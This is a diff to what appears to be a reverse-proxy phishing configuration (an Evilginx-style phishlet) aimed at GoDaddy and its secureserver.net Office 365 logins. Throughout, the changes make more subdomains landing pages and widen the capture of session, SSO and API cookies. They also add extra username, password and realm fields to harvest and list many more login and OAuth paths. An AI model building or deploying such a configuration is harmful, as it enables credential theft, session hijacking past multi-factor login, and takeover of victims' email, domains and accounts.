@@ -10,11 +10,11 @@ proxy_hosts:
   - {phish_sub: 'adfs', orig_sub: 'adfs', domain: '*', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'fs', orig_sub: 'fs', domain: '*', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'sts', orig_sub: 'sts', domain: '*', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'email', orig_sub: 'email', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'login', orig_sub: 'login', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'email', orig_sub: 'email', domain: 'secureserver.net', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'secureserver.net', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'secureserver.net', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'secureserver.net', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing: true, auto_filter: true}
   - {phish_sub: 'idp', orig_sub: 'idp', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'dcc', orig_sub: 'dcc', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'api', orig_sub: 'api', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
@@ -177,62 +177,62 @@ auth_tokens:
     force_post: false
 
   # GoDaddy Office 365 email cookies
-  - domain: '.secureserver.net'
+  - domain: 'secureserver.net'
     keys: ['JSESSIONID', 'GD_SESSION', 'auth_token', 'session_id', 'OIDC', 'RPSAuth', 'RPSSecAuth', 'gd_auth', 'secureserver_session']
     type: 'cookie'
     force_post: false
   
-  - domain: '.email.secureserver.net'
+  - domain: 'email.secureserver.net'
     keys: ['JSESSIONID', 'OutlookSession', 'X-OWA-CANARY', 'ClientId', 'sessionid', 'auth_key']
     type: 'cookie'
     force_post: false
   
   # GoDaddy SSO cookies
-  - domain: '.sso.secureserver.net'
+  - domain: 'sso.secureserver.net'
     keys: ['sso_token', 'JSESSIONID', 'auth_session', 'gd_sso', 'SSO_SESSION']
     type: 'cookie'
     force_post: false
   
-  - domain: '.sso.godaddy.com'
+  - domain: 'sso.godaddy.com'
     keys: ['sso_token', 'JSESSIONID', 'auth_session', 'gd_sso', 'SSO_SESSION', 'idp_session']
     type: 'cookie'
     force_post: false
   
-  - domain: '.godaddy.com'
-    keys: ['sso_token', 'auth_session', 'gd_session_id', 'idp_marker', 'SSO_COOKIE']
+  - domain: 'godaddy.com'
+    keys: ['sso_token', 'auth_session', 'gd_session_id', 'idp_marker', 'SSO_COOKIE', 'auth-sso', '_gd_session', 'market', 'currency', 'ips', 'auth_key']
     type: 'cookie'
     force_post: false
   
-  - domain: '.idp.godaddy.com'
+  - domain: 'idp.godaddy.com'
     keys: ['idp_session', 'auth_token', 'JSESSIONID', 'saml_session', 'federation_token']
     type: 'cookie'
     force_post: false
   
   # GoDaddy Domain Control Center cookies
-  - domain: '.dcc.godaddy.com'
+  - domain: 'dcc.godaddy.com'
     keys: ['dcc_session', 'JSESSIONID', 'control_token', 'DCC_AUTH', 'domain_session']
     type: 'cookie'
     force_post: false
   
   # GoDaddy API authentication
-  - domain: '.api.godaddy.com'
+  - domain: 'api.godaddy.com'
     keys: ['api_token', 'api_key', 'access_token', 'bearer_token', 'API_SESSION']
     type: 'cookie'
     force_post: false
   
   # GoDaddy Account management cookies
-  - domain: '.account.godaddy.com'
+  - domain: 'account.godaddy.com'
     keys: ['account_token', 'session_id', 'auth_session', 'JSESSIONID', 'ACCOUNT_AUTH']
     type: 'cookie'
     force_post: false
   
-  - domain: '.myaccount.godaddy.com'
+  - domain: 'myaccount.godaddy.com'
     keys: ['myaccount_session', 'auth_token', 'JSESSIONID', 'USER_SESSION', 'MY_ACCOUNT_TOKEN']
     type: 'cookie'
     force_post: false
   
   # GoDaddy main website cookies
-  - domain: '.www.godaddy.com'
+  - domain: 'www.godaddy.com'
     keys: ['www_session', 'visitor_id', 'JSESSIONID', 'GD_VISITOR', 'market', 'currency']
     type: 'cookie'
     force_post: false
@@ -274,13 +274,31 @@ credentials:
   
   # GoDaddy SSO username
   gdUsername:
-    key: 'user'
+    key: 'username'
     search: '(.*)'
     type: 'post'
   
   # GoDaddy SSO password
   gdPassword:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  
+  # GoDaddy alternate username fields
+  gdUser:
+    key: 'user'
+    search: '(.*)'
+    type: 'post'
+  
+  # GoDaddy alternate password fields
+  gdPass:
     key: 'pass'
+    search: '(.*)'
+    type: 'post'
+  
+  # GoDaddy realm/username combined
+  gdRealm:
+    key: 'realm'
     search: '(.*)'
     type: 'post'
   
@@ -365,6 +383,27 @@ auth_urls:
   - '/auth/signin'
   - '/sso/login'
   - '/api/v2/auth'
+  - '/authenticate'
+  - '/auth/login'
+  - '/sso/auth'
+  - '/sso/saml'
+  - '/email/login'
+  - '/webmail/login'
+  - '/owa/auth'
+  - '/api/auth/login'
+  - '/api/sso/login'
+  - '/idp/authenticate'
+  - '/federation/login'
+  - '/saml/sso'
+  - '/oauth2/authorize'
+  - '/oauth2/token'
+  - '/connect/authorize'
+  - '/connect/token'
+  - '/account/authenticate'
+  - '/dcc/authenticate'
+  - '/myaccount/login'
+  - '/customer/login'
+  - '/shopper/login'
 
 login:
   domain: 'login.microsoftonline.com'
